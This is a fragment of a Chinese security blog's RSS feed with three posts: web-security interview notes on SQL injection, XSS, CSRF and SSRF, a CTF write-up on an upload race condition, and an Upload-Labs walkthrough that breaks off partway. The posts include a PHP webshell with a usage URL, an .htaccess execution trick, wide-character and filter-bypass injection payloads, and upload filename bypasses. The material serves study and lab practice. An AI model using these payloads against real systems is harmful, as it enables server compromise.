3.从数据类型角度来防御：限制数据类型，并统一数据格式。 
4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入。 
5.从数据库管理者角度来防御：的最小权限原则，避免root,dbowner等高权限用户直接连接数据库。&lt;/p&gt;
  &lt;h3 id=&quot;为什么有的时候没有错误回显用php举例&quot;&gt;为什么有的时候没有错误回显，用php举例&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。
在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用。&lt;/p&gt;

&lt;p&gt;宽字符注入的原理？如何利用宽字符注入漏洞，payload如何构造？&lt;/p&gt;

&lt;p&gt;通俗讲，gbk，big5等编码占了两个字节，sql语句进后端后对单引号等进行了转义，转义\为%5C，当前面的%xx与%5C能结合成两个字节的字符时候，就可以使后面的单引号逃逸，从而造成注入。比较常见的gbk，%df’ =&amp;gt;
%df%5c%27 =&amp;gt; 運’ 。已经可以单引号了，剩下的就和普通注入差不多了。&lt;/p&gt;

&lt;h3 id=&quot;sql的bypass技巧&quot;&gt;sql的bypass技巧&lt;/h3&gt;

&lt;p&gt;这种太多了，网上一搜一大把。主要还是看目标站点的过滤和防护，常见bypass可以是&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;替换空格&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;  
&lt;span class=&quot;cm&quot;&gt;/*!00000union*/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;等于union&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;  
&lt;span class=&quot;nx&quot;&gt;或者利用前端过滤&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;添加尖括号&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;  &amp;gt;'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;大小写什么的都太常见了&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;如果过滤了函数或者关键字&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;可以尝试其他能达到效果的同等函数&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;关键字比如or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;可以用&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;替换&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;或者用运算符比如&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;达到相同的效果&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;总之&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;还是看要求&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;crlf注入的原理&quot;&gt;CRLF注入的原理&lt;/h2&gt;

&lt;p&gt;CRLF是回车+换行的简称。碰得比较少，基本没挖到过这种洞，简而言之一般是可以通过提交恶意数据里面包含回车，换行来达到控制服务器响应头的效果。碰到过潜在的CRLF都是提交回车和换行之后就500了。CRLF的利用可以是XSS，恶意重定向location，还有set-cookie.&lt;/p&gt;

&lt;h2 id=&quot;xss发生的场景&quot;&gt;XSS发生的场景&lt;/h2&gt;

&lt;p&gt;个人理解是对用户提交数据为进行安全的过滤然后直接输入到页面当中，造成js代码的执行。至于具体场景，有输出的地方就有可能被xss的风险。&lt;/p&gt;

&lt;h2 id=&quot;如果给你一个xss盲打漏洞但是返回来的信息显示他的后台在内网并且只能内网访问如何利用这个xss&quot;&gt;如果给你一个XSS盲打漏洞，但是返回来的信息显示，他的后台在内网，并且只能内网访问，如何利用这个xss？&lt;/h2&gt;

&lt;p&gt;github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell.&lt;/p&gt;

&lt;h2 id=&quot;phpini可以设置哪些安全特性&quot;&gt;php.ini可以设置哪些安全特性？&lt;/h2&gt;
&lt;p&gt;关闭报错，设置open_basedir，禁用危险函数，打开gpc。有具体的文章介绍安全配置这一块，属于运维的工作范围。&lt;/p&gt;
&lt;h2 id=&quot;php的00截断的原理&quot;&gt;php的%00截断的原理？&lt;/h2&gt;
&lt;p&gt;存在于5.3.4版本下，一般利用在文件上传时文件名的截断，或者在对文件进行操作时候都有可能存在00阶段的情况。 如filename=test.php%00.txt 会被截断成test.php，00后面的被忽略。系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了。&lt;/p&gt;
&lt;h2 id=&quot;webshell的检测有哪些方法&quot;&gt;webshell的检测，有哪些方法？&lt;/h2&gt;
&lt;p&gt;个人知道的大体上分为静态检测和动态检测两种。静态检测比如查找危险函数，如eval，system等。动态检测是检测脚本运行时要执行的动作，比如文件操作，socket操作等。具体方法可以是通过D盾或者其他查杀软件进行查杀，现在也有基于机器学习的webshell识别。&lt;/p&gt;
&lt;h2 id=&quot;csrf漏洞的本质是什么&quot;&gt;CSRF漏洞的本质是什么？&lt;/h2&gt;
&lt;p&gt;CSRF即跨站请求伪造，以受害者的身份向服务器发送一个请求。本质上个人觉得是服务端在执行一些敏感操作时候对提交操作的用户的身份校检不到位。&lt;/p&gt;
&lt;h3 id=&quot;防御csrf都有哪些方法java是如何防御csrf漏洞的token一定有用吗&quot;&gt;防御CSRF都有哪些方法，JAVA是如何防御CSRF漏洞的，token一定有用吗？&lt;/h3&gt;
&lt;p&gt;防御CSRF一般是加上referer和csrf_token.
jAVA不太懂。具体可以参考这篇CSRF攻击的CSRF攻击的应对之道&lt;/p&gt;
&lt;h2 id=&quot;ssrf漏洞判断的方法&quot;&gt;ssrf漏洞判断的方法：&lt;/h2&gt;
&lt;h3 id=&quot;介绍&quot;&gt;介绍：&lt;/h3&gt;
&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
&lt;h3 id=&quot;形成的原因&quot;&gt;形成的原因：&lt;/h3&gt;
&lt;p&gt;由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。&lt;/p&gt;
</description>
        <pubDate>Tue, 07 May 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/05/07/resttudy.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/05/07/resttudy.html</guid>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
        
        <category>WEB</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>结合CTF详解条件竞争漏洞</title>
        <description>&lt;h2 id=&quot;什么是条件竞争漏洞&quot;&gt;什么是条件竞争漏洞？&lt;/h2&gt;
&lt;p&gt;条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;p&gt;假设有这么一个代码，实现用户上传图片功能&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dst'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//check file&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dst'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;该代码中通过&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dst'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;将上传的文件从源地址转换到目的地址进行储存。&lt;br /&gt;
然后通过中间一系列check file代码，检查文件的安全性，如果发现该文件为不安全文件则使用unlink删除该文件。
但是如果判断时间过长，在该不安全文件被判定性质并且删除之前执行了该文件则会导致系统漏洞的形成。&lt;/p&gt;
&lt;h2 id=&quot;漏洞利用思路&quot;&gt;漏洞利用思路&lt;/h2&gt;
&lt;p&gt;攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。&lt;/p&gt;
&lt;h2 id=&quot;漏洞利用详细步骤&quot;&gt;漏洞利用详细步骤&lt;/h2&gt;
&lt;p&gt;1.抓包并根据过滤条件修改后发送到Intruder模块开多线程不断发包,使WEB服务不断接受该文件。
&lt;img src=&quot;https://img-blog.csdn.net/201803102006224?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;屏幕快照 2019-04-12 18.26.16.png&quot; /&gt;
2.然后写一个python脚本不断去访问那个文件，如果在WEB服务判定并删除不安全文件之前成功的访问则会达到效果。&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'你的文件路径'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'moctf'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;相关ctf题目&quot;&gt;相关CTF题目&lt;/h2&gt;
&lt;h3 id=&quot;moctf-web-没时间解释了&quot;&gt;moctf web-没时间解释了&lt;/h3&gt;

&lt;p&gt;进入题目发现URL为index2.php,尝试访问index.php发现存在短暂跳转。抓包后发现
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb082e3c7046.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb082e3c7046.png&quot; alt=&quot;屏幕快照 2019-04-12 20.21.27.png&quot; /&gt;&lt;/a&gt;
访问这个网页，发现为上传界面，随便输入两个值
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb0849537251.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb0849537251.png&quot; alt=&quot;屏幕快照 2019-04-12 20.28.44.png&quot; /&gt;&lt;/a&gt;
访问这个网址后被告知太慢了，猜测可能为时间竞争类型。
使用burp多线程并发提交&lt;/p&gt;
&lt;h3 id=&quot;抓取输入界面的包&quot;&gt;抓取输入界面的包&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb08929ce64a.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb08929ce64a.png&quot; alt=&quot;屏幕快照 2019-04-12 20.41.41.png&quot; /&gt;&lt;/a&gt;
sent to Intruder 
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb089af69160.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb089af69160.png&quot; alt=&quot;屏幕快照 2019-04-12 20.41.41.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;访问too-slow-的页面并抓包&quot;&gt;访问Too slow 的页面并抓包&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb08a119212e.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb08a119212e.png&quot; alt=&quot;屏幕快照 2019-04-12 20.41.48.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;配置intruder&quot;&gt;配置Intruder&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb08a7b2801b.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb08a7b2801b.png&quot; alt=&quot;屏幕快照 2019-04-12 20.42.08.png&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb08a7b2cdd8.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb08a7b2cdd8.png&quot; alt=&quot;屏幕快照 2019-04-12 20.41.55.png&quot; /&gt;&lt;/a&gt;
两个配置相同&lt;br /&gt;
同时启动两个Attack进程，在Too slow页面发现flag  &lt;br /&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb08a35088ab.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb08a35088ab.png&quot; alt=&quot;屏幕快照 2019-04-12 20.40.57.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 13 Apr 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/04/13/batterupload.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/04/13/batterupload.html</guid>
        
        <category>CTF</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
        
        <category>CTF</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>Uplode-Labs通关笔记</title>
        <description>&lt;h2 id=&quot;漏洞类型分析&quot;&gt;漏洞类型分析&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5caafd2f23ed2.png&quot; alt=&quot;漏洞类型分析&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞类型判断&quot;&gt;漏洞类型判断&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5caafa634c7f7.png&quot; alt=&quot;思路图&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;简单shell制作&quot;&gt;简单shell制作&lt;/h2&gt;
&lt;p&gt;shell.php&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;使用方法：&lt;br /&gt;
http://104.36.68.99/upload/shell.php?cmd=phpinfo();&lt;/p&gt;
&lt;h2 id=&quot;pass-1--前端js判断&quot;&gt;Pass-1  （前端JS判断）&lt;/h2&gt;
&lt;p&gt;使用burp进行抓包直接上传webshell，发现在没有数据传输的情况下判定为不合规文件这说明在客户端通过JS进行判断&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/08/5cab0e218624d.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5cab0e218624d.png&quot; alt=&quot;屏幕快照 2019-04-08 16.58.50.png&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/08/5cab0e2234de6.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5cab0e2234de6.png&quot; alt=&quot;屏幕快照 2019-04-08 16.59.04.png&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/08/5cab0e22e9b1e.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5cab0e22e9b1e.png&quot; alt=&quot;屏幕快照 2019-04-08 16.59.06.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;将图中标红色的1.php改为1.png&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png&quot; alt=&quot;屏幕快照 2019-04-08 17.00.48.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;成功上传，执行shell&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2019/04/08/5cab108972e22.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/08/5cab108972e22.png&quot; alt=&quot;屏幕快照 2019-04-08 17.12.25.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;大佬教的骚操作&quot;&gt;大佬教的骚操作：&lt;/h3&gt;
&lt;p&gt;禁用本页JS，直接上传 &lt;br /&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/09/5cabf54fdd3de.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cabf54fdd3de.png&quot; alt=&quot;01-1.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;pass-2--服务器端端后缀判断&quot;&gt;Pass-2  （服务器端端后缀判断）&lt;/h2&gt;

&lt;p&gt;使用burp抓包上传1.php，网页发送数据，burp获得流量，可以判断为服务器端响应。&lt;br /&gt;
①将文件后缀修改为jpg后上传，再将1.png修改为1.php,成功上传  &lt;br /&gt;
②上传1.php，将包文件中的 Content-Type: 修改为 image/jpeg 成功上传 &lt;br /&gt;
最终达到的效果为：
&lt;a href=&quot;https://i.loli.net/2019/04/09/5cabece6799fe.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cabece6799fe.png&quot; alt=&quot;屏幕快照 2019-04-09 08.52.37.png&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
可以判断为服务器端检查文件类型&lt;/p&gt;
&lt;h2 id=&quot;pass-3白名单-phtmlphp5&quot;&gt;Pass-3（白名单-.phtml、.php5）&lt;/h2&gt;
&lt;p&gt;将1.php的后缀修改为jpg进行上传，抓包修改后缀上传提示错误 &lt;br /&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/09/5cabef6455bba.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cabef6455bba.png&quot; alt=&quot;屏幕快照 2019-04-09 09.02.22.png&quot; /&gt;&lt;/a&gt;
证明服务器端检查后缀 &lt;br /&gt;
尝试上传任意后缀文件（php语言除了可以解析以php为后缀的文件，还可以解析phtml、php2，php3、php4、php5这些后缀的文件。）&lt;/p&gt;

&lt;p&gt;上传成功，证明使用的检查模式为黑名单检查。&lt;/p&gt;

&lt;h2 id=&quot;pass-4-白名单-htaccess&quot;&gt;Pass-4 （白名单-.htaccess)&lt;/h2&gt;
&lt;p&gt;本题目为JS前端判断后缀，服务端黑名单过滤数据。&lt;br /&gt;
后端未过滤”.htaccess”文件，上传”.htaccess”文件，文件内容为&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
SetHandler application/x-httpd-php
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;该代码文件将03.jpg解析为php文件&lt;br /&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/09/5cac893e518c1.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac893e518c1.png&quot; alt=&quot;屏幕快照 2019-04-09 19.53.36.png&quot; /&gt;&lt;/a&gt;
上传成功后，上传图片马03.jpg ，运行成功  &lt;br /&gt;
&lt;a href=&quot;https://i.loli.net/2019/04/09/5cac8971e083b.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac8971e083b.png&quot; alt=&quot;屏幕快照 2019-04-09 19.55.50.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;pass-5未区分大小写&quot;&gt;Pass-5（未区分大小写）&lt;/h2&gt;
&lt;p&gt;Pass-4中存在以下代码：&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//转换为小写&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;而Pass-5中没有，说明Pass-5虽然过滤了所有的文件后缀，但是没有区分大小写。
上传shell.PHP即可绕过&lt;/p&gt;
&lt;h2 id=&quot;pass-6文件名后缀空格&quot;&gt;Pass-6（文件名+后缀+空格）&lt;/h2&gt;
&lt;p&gt;相比于第五关的过滤条件缺少了&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//首尾去空&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;所以通过构造文件名+后缀+空格进行绕过，即”shell.php “&lt;/p&gt;
&lt;h2 id=&quot;pass-7--shellphp&quot;&gt;Pass-7  （shell.php.）&lt;/h2&gt;
&lt;p&gt;缺少”.”过滤代码：&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deldot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//删除文件名末尾的点&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;所以利用windows文件系统的文件名特性（windows系统上的文件名最后一个.会被去掉）通过构造shell.php.进行绕过&lt;/p&gt;
&lt;h2 id=&quot;pass-8-data&quot;&gt;Pass-8 （::$DATA）&lt;/h2&gt;
&lt;p&gt;Windows文件流特性绕过，文件名改成shell.php::$DATA，上传成功后保存的文件名其实是shell.php&lt;/p&gt;
&lt;h2 id=&quot;pass-9--点空格点&quot;&gt;Pass-9  （点+空格+点）&lt;/h2&gt;
